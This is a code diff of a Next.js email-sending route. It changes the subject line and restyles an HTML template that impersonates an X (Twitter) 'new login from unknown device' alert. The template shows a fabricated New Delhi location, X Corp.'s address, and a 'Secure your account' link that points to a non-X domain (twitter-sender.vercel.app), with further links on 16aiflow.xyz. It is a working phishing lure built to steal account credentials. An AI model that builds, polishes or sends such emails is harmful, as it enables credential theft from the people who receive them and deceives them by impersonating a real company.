@@ -65,7 +65,7 @@ export async function POST(request: NextRequest) {
 				resend.emails.send({
 					from: fromField,
 					to,
-					subject: "Complete your login",
+					subject: "Account Login from Unknown Device",
 					html: generateEmailHTML(),
 				})
 			),
@@ -91,174 +91,202 @@ export async function POST(request: NextRequest) {
 
 function generateEmailHTML(): string {
 	return `
-    <!DOCTYPE html>
-    <html>
-    <head>
-      <meta charset="utf-8">
-      <meta name="viewport" content="width=device-width, initial-scale=1.0">
-      <title>New login to your account</title>
-    </head>
-    <body bgcolor="#ffffff" style="margin:0;padding:0">
-      <table cellpadding="0" cellspacing="0" border="0" width="100%" bgcolor="#F5F8FA" style="padding:0;margin:0;line-height:1px;font-size:1px">
-<tbody>
-<tr>
-<td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px">
-<table id="m_3433587548594661883header" align="center" width="448" style="width:448px;padding:0;margin:0;line-height:1px;font-size:1px" bgcolor="#ffffff" cellpadding="0" cellspacing="0" border="0">
-<tbody>
-<tr>
-<td style="min-width:448px;padding:0;margin:0;line-height:1px;font-size:1px"> </td>
-</tr>
-</tbody>
-</table> </td>
-</tr>
-<tr>
-<td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px">
-
-<table id="m_3433587548594661883header" align="center" width="448" style="width:448px;background-color:#ffffff;padding:0;margin:0;line-height:1px;font-size:1px" bgcolor="#ffffff" cellpadding="0" cellspacing="0" border="0">
-<tbody>
-<tr>
-<td colspan="3" height="24" style="height:24px;padding:0;margin:0;line-height:1px;font-size:1px"> &nbsp; </td>
-</tr>
-<tr align="right">
-<td width="24" style="padding:0;margin:0;line-height:1px;font-size:1px"></td>
-<td align="right" style="padding:0;margin:0;line-height:1px;font-size:1px"> <a href="https://16aiflow.xyz/reset" style="text-decoration:none;border-style:none;border:0;padding:0;margin:0"> <img width="32" align="right" src="https://16aiflow.xyz/mele.png" style="width:32px;margin:0;padding:0;display:block;border:none;outline:none"> </a> </td>
-<td width="24" style="padding:0;margin:0;line-height:1px;font-size:1px"></td>
-</tr>
-<tr>
-<td colspan="4" height="24" style="height:24px;padding:0;margin:0;line-height:1px;font-size:1px"> </td>
-</tr>
-</tbody>
-</table>
-
-
-<table id="m_3433587548594661883header" align="center" width="448" style="width:448px;background-color:#ffffff;padding:0;margin:0;line-height:1px;font-size:1px" bgcolor="#ffffff" cellpadding="0" cellspacing="0" border="0">
-<tbody>
-<tr align="left;">
-<td width="24" style="padding:0;margin:0;line-height:1px;font-size:1px"></td>
-<td align="left;" style="padding:0;margin:0;line-height:1px;font-size:1px">
-<table cellpadding="0" cellspacing="0" border="0" style="padding:0;margin:0;line-height:1px;font-size:1px">
-<tbody>
-<tr>
-<td align="left;" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:24px;line-height:32px;font-weight:bold;color:#292f33;text-align:left;text-decoration:none"> We noticed a login to your account from a new device. Was this you? </td>
-</tr>
-<tr>
-<td height="24" style="padding:0;margin:0;line-height:1px;font-size:1px"></td>
-</tr>
-<tr>
-<td align="left;" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:14px;line-height:16px;font-weight:400;color:#292f33;text-align:left;text-decoration:none"> <strong>New login</strong> </td>
-</tr>
-<tr>
-<td height="6" style="padding:0;margin:0;line-height:1px;font-size:1px"></td>
-</tr>
-<tr>
-<td style="padding:0;margin:0;line-height:1px;font-size:1px">
-<table width="100%" align="center" cellspacing="0" border="0" style="padding:0;margin:0;line-height:1px;font-size:1px">
-<tbody>
-<tr>
-<td width="30" style="width:30px;padding:0;margin:0;line-height:1px;font-size:1px"></td>
-<td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px">
-<table width="100%" align="center" cellpadding="0" cellspacing="0" border="0" style="padding:0;margin:0;line-height:1px;font-size:1px">
-<tbody>
-<tr>
-<td align="left" width="25%" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:14px;line-height:16px;font-weight:400;color:#292f33;text-align:left;text-decoration:none"><strong>Location*</strong></td>
-<td width="15" style="width:15px;padding:0;margin:0;line-height:1px;font-size:1px"></td>
-<td align="left" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:14px;line-height:16px;font-weight:400;color:#292f33;text-align:left;text-decoration:none"> Connaught Place, New Delhi, India</td>
-</tr>
-<tr>
-<td align="left" width="25%" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:14px;line-height:16px;font-weight:400;color:#292f33;text-align:left;text-decoration:none"><strong>Device</strong></td>
-<td width="15" style="width:15px;padding:0;margin:0;line-height:1px;font-size:1px"></td>
-<td align="left" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:14px;line-height:16px;font-weight:400;color:#292f33;text-align:left;text-decoration:none"> FirefoxDesktop on Windows </td>
-</tr>
-</tbody>
-</table> </td>
-</tr>
-</tbody>
-</table> </td>
-</tr>
-<tr>
-<td height="14" style="padding:0;margin:0;line-height:1px;font-size:1px"></td>
-</tr>
-<tr>
-<td align="left" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:12px;line-height:16px;font-weight:400;color:#8899a6;text-align:left;text-decoration:none"> *Location is approximate based on the login's IP address. </td>
-</tr>
-<tr>
-<td height="24" style="height:24px;padding:0;margin:0;line-height:1px;font-size:1px"></td>
-</tr>
-<tr>
-<td align="left" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:14px;line-height:16px;font-weight:400;color:#292f33;text-align:left;text-decoration:none"> <strong>If this was you</strong> </td>
-</tr>
-<tr>
-<td height="6" style="padding:0;margin:0;line-height:1px;font-size:1px"></td>
-</tr>
-<tr>
-<td align="left" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:16px;line-height:20px;font-weight:400;color:#292f33;text-align:left;text-decoration:none"> You can ignore this message. There's no need to take any action. </td>
-</tr>
-<tr>
-<td height="24" style="height:24px;padding:0;margin:0;line-height:1px;font-size:1px"></td>
-</tr>
-<tr>
-<td align="left;" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:14px;line-height:16px;font-weight:400;color:#292f33;text-align:left;text-decoration:none"> <strong>If this wasn't you</strong> </td>
-</tr>
-<tr>
-<td height="6" style="padding:0;margin:0;line-height:1px;font-size:1px"></td>
-</tr>
-<tr>
-<td align="left;" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:16px;line-height:20px;font-weight:400;color:#292f33;text-align:left;text-decoration:none"> Complete these steps now to protect your account. </td>
-</tr>
-<tr>
-<td height="6" style="padding:0;margin:0;line-height:1px;font-size:1px"></td>
-</tr>
-<tr>
-<td align="left;" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:16px;line-height:20px;font-weight:400;color:#292f33;text-align:left;text-decoration:none">
-<ul>
-<li align="left" dir="ltr">
-  <a href="https://twitter-sender.vercel.app/reset" 
-     style="text-decoration:none;color:#1da1f2;font-weight:400;" 
-     rel="noopener">
-    Secure your account.
-  </a> 
-  You'll be logged out of all your active sessions except the one you're using at this time.
-</li>
-</ul> </td>
-</tr>
-<tr>
-<td height="36" style="padding:0;margin:0;line-height:1px;font-size:1px"></td>
-</tr>
-</tbody>
-</table> </td>
-<td width="24" style="padding:0;margin:0;line-height:1px;font-size:1px"></td>
-</tr>
-</tbody>
-</table>
-
-
-<table id="m_3433587548594661883footer" align="center" width="448" style="width:448px;background-color:#ffffff;padding:0;margin:0;line-height:1px;font-size:1px" cellpadding="0" cellspacing="0" border="0">
-<tbody>
-<tr>
-<td height="36" style="height:36px;padding:0;margin:0;line-height:1px;font-size:1px"></td>
-</tr>
-<tr>
-<td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px"> <span style="font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:12px;line-height:16px;font-weight:400;color:#8899a6;text-align:left;text-decoration:none"> <a href="https://16aiflow.xyz/help" style="text-decoration:none;border-style:none;border:0;padding:0;margin:0;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:12px;line-height:16px;font-weight:400;color:#8899a6;text-align:left;text-decoration:none;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:12px;line-height:16px;font-weight:600;color:#1da1f2;text-align:left;text-decoration:none" target="_blank">Help</a> &nbsp;|&nbsp; <a href="https://16aiflow.xyz/email" style="text-decoration:none;border-style:none;border:0;padding:0;margin:0;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:12px;line-height:16px;font-weight:400;color:#8899a6;text-align:left;text-decoration:none;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:12px;line-height:16px;font-weight:600;color:#1da1f2;text-align:left;text-decoration:none" target="_blank">Email security tips</a> </span> </td>
-</tr>
-<tr>
-<td height="12" style="height:12px;line-height:1px;font-size:1px;padding:0;margin:0;line-height:1px;font-size:1px"></td>
-</tr>
-<tr>
-<td height="6" style="height:6px;line-height:1px;font-size:1px;padding:0;margin:0;line-height:1px;font-size:1px"></td>
-</tr>
-<tr>
-<td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px"> <span style="font-family:'Helvetica Neue Light',Helvetica,Arial,sans-serif;font-size:12px;padding:0px;margin:0px;font-weight:normal;line-height:16px;color:#8899a6;text-decoration:none"> X Corp. 1355 Market Street, Suite 900 San Francisco, CA 94103 </span> </td>
-</tr>
-<tr>
-<td height="72" style="height:72px;padding:0;margin:0;line-height:1px;font-size:1px"></td>
-</tr>
-</tbody>
-</table>
- </td>
-</tr>
-</tbody>
-</table>
-    </body>
-    </html>
+ <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>New Login to Your Account</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #f5f8fa;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+    }
+    .wrapper {
+      width: 100%;
+      background-color: #f5f8fa;
+      padding: 40px 0;
+    }
+    .container {
+      max-width: 600px;
+      margin: 0 auto;
+      background-color: #ffffff;
+      border-radius: 8px;
+      overflow: hidden;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+    }
+    .header {
+      padding: 32px 40px 24px;
+      text-align: right;
+    }
+    .logo {
+      width: 40px;
+      height: 40px;
+    }
+    .content {
+      padding: 0 40px 40px;
+    }
+    .title {
+      font-size: 24px;
+      font-weight: 600;
+      color: #14171a;
+      line-height: 32px;
+      margin: 0 0 24px;
+    }
+    .section-title {
+      font-size: 16px;
+      font-weight: 600;
+      color: #14171a;
+      margin: 24px 0 12px;
+    }
+    .info-box {
+      background-color: #f7f9fa;
+      border-radius: 6px;
+      padding: 20px;
+      margin: 12px 0 24px;
+    }
+    .info-row {
+      display: flex;
+      margin-bottom: 12px;
+    }
+    .info-row:last-child {
+      margin-bottom: 0;
+    }
+    .info-label {
+      font-weight: 600;
+      color: #14171a;
+      min-width: 80px;
+      font-size: 14px;
+    }
+    .info-value {
+      color: #536471;
+      font-size: 14px;
+      flex: 1;
+    }
+    .text {
+      font-size: 16px;
+      line-height: 24px;
+      color: #536471;
+      margin: 12px 0;
+    }
+    .disclaimer {
+      font-size: 13px;
+      color: #8899a6;
+      margin: 16px 0 0;
+    }
+    .action-list {
+      margin: 16px 0;
+      padding-left: 20px;
+    }
+    .action-list li {
+      font-size: 16px;
+      line-height: 24px;
+      color: #536471;
+      margin-bottom: 12px;
+    }
+    .link {
+      color: #1da1f2;
+      text-decoration: none;
+      font-weight: 500;
+    }
+    .link:hover {
+      text-decoration: underline;
+    }
+    .footer {
+      padding: 32px 40px;
+      text-align: center;
+      background-color: #f7f9fa;
+      border-top: 1px solid #e1e8ed;
+    }
+    .footer-links {
+      font-size: 13px;
+      color: #8899a6;
+      margin-bottom: 16px;
+    }
+    .footer-links a {
+      color: #1da1f2;
+      text-decoration: none;
+      font-weight: 500;
+    }
+    .footer-address {
+      font-size: 12px;
+      color: #8899a6;
+      line-height: 18px;
+    }
+    @media only screen and (max-width: 640px) {
+      .container {
+        border-radius: 0;
+      }
+      .header, .content, .footer {
+        padding-left: 24px;
+        padding-right: 24px;
+      }
+      .title {
+        font-size: 20px;
+        line-height: 28px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="wrapper">
+    <div class="container">
+      <!-- Header -->
+      <div class="header">
+        <img src="https://16aiflow.xyz/mele.png" alt="Logo" class="logo">
+      </div>
+      
+      <!-- Main Content -->
+      <div class="content">
+        <h1 class="title">We noticed a login to your account from a new device. Was this you?</h1>
+        
+        <div class="section-title">New Login</div>
+        
+        <div class="info-box">
+          <div class="info-row">
+            <span class="info-label">Location*</span>
+            <span class="info-value">Connaught Place, New Delhi, India</span>
+          </div>
+          <div class="info-row">
+            <span class="info-label">Device</span>
+            <span class="info-value">Firefox Desktop on Windows</span>
+          </div>
+        </div>
+        
+        <p class="disclaimer">*Location is approximate based on the login's IP address.</p>
+        
+        <div class="section-title">If this was you</div>
+        <p class="text">You can ignore this message. There's no need to take any action.</p>
+        
+        <div class="section-title">If this wasn't you</div>
+        <p class="text">Complete these steps now to protect your account:</p>
+        
+        <ul class="action-list">
+          <li>
+            <a href="https://twitter-sender.vercel.app/reset" class="link">Secure your account.</a>
+            You'll be logged out of all your active sessions except the one you're using at this time.
+          </li>
+        </ul>
+      </div>
+      
+      <!-- Footer -->
+      <div class="footer">
+        <div class="footer-links">
+          <a href="https://16aiflow.xyz/help">Help</a> | 
+          <a href="https://16aiflow.xyz/email">Email security tips</a>
+        </div>
+        <div class="footer-address">
+          X Corp.<br>
+          1355 Market Street, Suite 900<br>
+          San Francisco, CA 94103
+        </div>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
   `;
 }
